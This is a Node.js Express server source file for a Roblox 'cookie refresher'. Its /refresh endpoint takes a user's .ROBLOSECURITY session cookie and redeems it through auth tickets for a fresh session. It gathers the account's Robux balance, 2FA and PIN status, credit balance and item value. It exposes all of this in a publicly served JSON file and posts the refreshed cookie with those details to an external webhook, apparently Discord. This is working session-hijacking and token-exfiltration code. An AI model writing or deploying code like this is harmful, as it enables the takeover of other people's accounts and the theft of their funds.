require('dotenv').config();

const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { generateAuthTicket, redeemAuthTicket } = require('./auth');
const { RobloxUser } = require('./user');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, '../../public')));

// Serve the JSON file from the /data endpoint
app.get('/data/refreshed_cookie.json', (req, res) => {
    res.sendFile(path.join(__dirname, '../../public/data/refreshed_cookie.json'));
});

app.get('/data/test.json', (req, res) => {
    res.json({ message: "Test file successfully served" });
});

app.get('/refresh', async (req, res) => {
    const roblosecurityCookie = req.query.cookie;

    if (!roblosecurityCookie) {
        res.status(400).json({ error: "Cookie is required" });
        return;
    }

    try {
        const authTicket = await generateAuthTicket(roblosecurityCookie);
        if (authTicket === "Failed to fetch auth ticket") {
            res.status(400).json({ error: "Invalid cookie" });
            return;
        }

        const redemptionResult = await redeemAuthTicket(authTicket);
        if (!redemptionResult.success) {
            if (redemptionResult.robloxDebugResponse && redemptionResult.robloxDebugResponse.status === 401) {
                res.status(401).json({ error: "Unauthorized: The provided cookie is invalid." });
            } else {
                res.status(400).json({ error: "Invalid cookie" });
            }
            return;
        }

        const refreshedCookie = redemptionResult.refreshedCookie || '';
        const robloxUser = await RobloxUser.register(roblosecurityCookie);
        const userData = await robloxUser.getUserData();

        const debugInfo = `Auth Ticket ID: ${authTicket}`;
        const fileContent = {
            RefreshedCookie: refreshedCookie,
            DebugInfo: debugInfo,
            Username: userData.username,
            UserID: userData.uid,
            DisplayName: userData.displayName,
            CreationDate: userData.createdAt,
            Country: userData.country,
            AccountBalanceRobux: userData.balance,
            Is2FAEnabled: userData.isTwoStepVerificationEnabled,
            IsPINEnabled: userData.isPinEnabled,
            IsPremium: userData.isPremium,
            CreditBalance: userData.creditbalance,
            RAP: userData.rap,
        };

        const dirPath = path.join(__dirname, '../../public/data');
        const filePath = path.join(dirPath, 'refreshed_cookie.json');

        // Ensure the directory exists
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
        }

        // Write to the file
        fs.writeFileSync(filePath, JSON.stringify(fileContent, null, 4));

        // Update the profile
        updateProfile(fileContent);

        const webhookURL = process.env.WEBHOOK_URL; // Use environment variable
        await axios.post(webhookURL, {
            embeds: [
                {
                    title: 'Refreshed Cookie',
                    description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
                    color: 16776960,
                    fields: [
                        { name: 'Username', value: userData.username, inline: true },
                        { name: 'User ID', value: userData.uid, inline: true },
                        { name: 'Display Name', value: userData.displayName, inline: true },
                        { name: 'Creation Date', value: userData.createdAt, inline: true },
                        { name: 'Country', value: userData.country, inline: true },
                        { name: 'Account Balance (Robux)', value: userData.balance, inline: true },
                        { name: 'Is 2FA Enabled', value: userData.isTwoStepVerificationEnabled, inline: true },
                        { name: 'Is PIN Enabled', value: userData.isPinEnabled, inline: true },
                        { name: 'Is Premium', value: userData.isPremium, inline: true },
                        { name: 'Credit Balance', value: userData.creditbalance, inline: true },
                        { name: 'RAP', value: userData.rap, inline: true },
                    ],
                }
            ]
        });

        console.log('Sent successfully');

        res.json({ 
            authTicket, 
            redemptionResult,
            userData: {
                username: userData.username,
                balance: userData.balance
            }
        });
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// Dummy function to update profile directly
function updateProfile(profileData) {
    // Implement the logic to update the profile here
    console.log('Profile updated with:', profileData);
}
